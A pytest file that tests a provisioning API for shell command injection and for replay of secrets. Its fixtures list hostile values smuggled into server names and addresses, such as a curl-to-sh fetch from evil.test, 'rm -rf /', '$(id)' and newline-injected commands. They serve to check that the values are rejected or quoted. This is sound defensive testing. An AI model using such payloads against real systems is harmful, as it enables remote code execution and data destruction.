"""S1 / S2: the provisioning path must never hand a shell an unquoted value, and
must not re-serve secrets to a replayed (log-visible) token URL."""
from __future__ import annotations

import shlex

import pytest
from sqlmodel import select

from app.models import ProvisioningToken, ProvisionStatus, Server
from app.routers.provision import _render_install_script


def _create_token(client, headers, **overrides):
    payload = {"name": "edge-1", "method": "docker"}
    payload.update(overrides)
    return client.post("/api/provision/tokens", json=payload, headers=headers)


# --------------------------------------------------------------------------- #
# S1 — command injection into the root-executed install script
# --------------------------------------------------------------------------- #
INJECTION_NAMES = [
    "x'; curl http://evil.test/x | sh; echo '",
    "x'; rm -rf /; '",
    'x"; touch /tmp/pwned; "',
    "x$(id)",
    "x`id`",
    "x\nrm -rf /\n",
    "x'\nwhoami\n'",
]


@pytest.mark.parametrize("evil", INJECTION_NAMES)
def test_injection_in_name_is_rejected_or_neutralised(client, editor_headers, session, evil):
    """A server name must never be able to run a command on the target host.

    Names carrying control characters are rejected outright; anything else that
    survives validation must come back out of /config as a single shell word.
    """
    resp = _create_token(client, editor_headers, name=evil)
    if resp.status_code == 422:
        return  # rejected at the schema boundary — the strongest outcome

    assert resp.status_code == 200, resp.text
    token = resp.json()["token"]

    cfg = client.get(f"/api/provision/{token}/config")
    assert cfg.status_code == 200
    line = next(ln for ln in cfg.text.splitlines() if ln.startswith("SERVER_NAME="))

    # shlex parses the line exactly as `eval` in install.sh would.
    parsed = shlex.split(line)
    assert len(parsed) == 1, f"name broke out into multiple shell words: {parsed}"
    assert parsed[0] == f"SERVER_NAME={evil.strip()}"


def test_newline_in_name_is_rejected(client, editor_headers):
    """Quoting cannot save a value containing a newline, so it must not be stored."""
    resp = _create_token(client, editor_headers, name="ok\nrm -rf /")
    assert resp.status_code == 422


def test_config_values_are_all_single_shell_words(client, editor_headers):
    resp = _create_token(client, editor_headers, name="edge-1")
    token = resp.json()["token"]
    cfg = client.get(f"/api/provision/{token}/config")

    for line in cfg.text.strip().splitlines():
        parsed = shlex.split(line)
        assert len(parsed) == 1, f"{line!r} expands to {parsed}"
        assert "=" in parsed[0]


def test_generated_password_survives_shell_quoting(client, editor_headers, session):
    """The generated admin password is eval'd into a variable; it must round-trip."""
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    cfg = client.get(f"/api/provision/{token}/config").text

    row = session.exec(select(ProvisioningToken).where(ProvisioningToken.token == token)).one()
    from app.security import decrypt_secret

    expected = decrypt_secret(row.admin_password_enc)

    line = next(ln for ln in cfg.splitlines() if ln.startswith("ADMIN_PASSWORD="))
    assert shlex.split(line)[0] == f"ADMIN_PASSWORD={expected}"


def test_install_script_comment_cannot_be_escaped(session):
    """Rows predating validation still render into a root-run script."""
    t = ProvisioningToken(
        token="tok-legacy",
        name="legacy\nrm -rf /\n# ",  # written before schema validation existed
        expires_at=__import__("datetime").datetime.now(__import__("datetime").timezone.utc),
    )
    script = _render_install_script(t)
    header = script.splitlines()[1]
    assert header.startswith("#")
    assert "\n" not in header
    assert "rm -rf /" in header  # neutralised into the comment, not a new line
    # The injected command must not appear at the start of any line.
    assert not any(ln.strip().startswith("rm -rf") for ln in script.splitlines())


def test_install_script_quotes_base_url_and_token(client, editor_headers):
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    script = client.get(f"/api/provision/{token}/install.sh").text
    base_line = next(ln for ln in script.splitlines() if ln.startswith("BASE_URL="))
    token_line = next(ln for ln in script.splitlines() if ln.startswith("TOKEN="))
    assert len(shlex.split(base_line)) == 1
    assert shlex.split(token_line)[0] == f"TOKEN={token}"


# --------------------------------------------------------------------------- #
# S1 — host validation on connect_address and /complete
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("bad", [
    "evil.test/../../x",
    "http://evil.test",
    "host with spaces",
    "host;rm -rf /",
    "a" * 300,
    "-leading-hyphen.test",
])
def test_bad_connect_address_rejected(client, editor_headers, bad):
    resp = _create_token(client, editor_headers, name="edge-1", ssl_enabled=True, connect_address=bad)
    assert resp.status_code == 422, resp.text


@pytest.mark.parametrize("good", ["agh.example.com", "10.0.0.5", "host-1", "::1"])
def test_good_connect_address_accepted(client, editor_headers, good):
    resp = _create_token(client, editor_headers, name="edge-1", ssl_enabled=True, connect_address=good)
    assert resp.status_code == 200, resp.text


def test_complete_rejects_non_host_address(client, editor_headers):
    """/complete is token-authenticated only and its address becomes a URL we
    connect to with credentials and reverse-proxy — it must be a bare host."""
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    resp = client.post(
        f"/api/provision/{token}/complete",
        json={"address": "evil.test/path#", "http_port": 3000},
    )
    assert resp.status_code == 422


def test_complete_brackets_ipv6_address(client, editor_headers, session):
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    resp = client.post(
        f"/api/provision/{token}/complete",
        json={"address": "fd00::1", "http_port": 3000},
    )
    assert resp.status_code == 200, resp.text
    server = session.get(Server, resp.json()["server_id"])
    assert server.url == "http://[fd00::1]:3000"


# --------------------------------------------------------------------------- #
# S2 — secrets are single-fetch
# --------------------------------------------------------------------------- #
def test_config_is_single_fetch(client, editor_headers):
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]

    first = client.get(f"/api/provision/{token}/config")
    assert first.status_code == 200
    assert "ADMIN_PASSWORD=" in first.text

    replay = client.get(f"/api/provision/{token}/config")
    assert replay.status_code == 410
    assert "already been retrieved" in replay.json()["detail"]


def test_private_key_is_single_fetch(client, editor_headers):
    token = _create_token(
        client, editor_headers, name="edge-1", ssl_enabled=True, connect_address="agh.example.com"
    ).json()["token"]

    first = client.get(f"/api/provision/{token}/key.pem")
    assert first.status_code == 200
    assert "PRIVATE KEY" in first.text

    replay = client.get(f"/api/provision/{token}/key.pem")
    assert replay.status_code == 410


def test_certificate_stays_repeatable(client, editor_headers):
    """The public cert is not a secret and install.sh may retry it."""
    token = _create_token(
        client, editor_headers, name="edge-1", ssl_enabled=True, connect_address="agh.example.com"
    ).json()["token"]

    assert client.get(f"/api/provision/{token}/cert.pem").status_code == 200
    assert client.get(f"/api/provision/{token}/cert.pem").status_code == 200


def test_revoked_token_serves_nothing(client, editor_headers):
    created = _create_token(client, editor_headers, name="edge-1").json()
    client.post(f"/api/provision/tokens/{created['id']}/revoke", headers=editor_headers)
    assert client.get(f"/api/provision/{created['token']}/config").status_code == 410


def test_completed_token_serves_nothing(client, editor_headers):
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    client.post(f"/api/provision/{token}/complete", json={"address": "10.0.0.9"})
    assert client.get(f"/api/provision/{token}/config").status_code == 409


def test_token_creation_requires_editor(client, viewer_headers):
    assert _create_token(client, viewer_headers, name="edge-1").status_code == 403


def test_complete_marks_token_used_and_creates_server(client, editor_headers, session):
    token = _create_token(client, editor_headers, name="edge-1").json()["token"]
    resp = client.post(f"/api/provision/{token}/complete", json={"address": "10.0.0.9"})
    assert resp.status_code == 200

    row = session.exec(select(ProvisioningToken).where(ProvisioningToken.token == token)).one()
    assert row.status == ProvisionStatus.completed
    server = session.get(Server, resp.json()["server_id"])
    assert server.url == "http://10.0.0.9:3000"
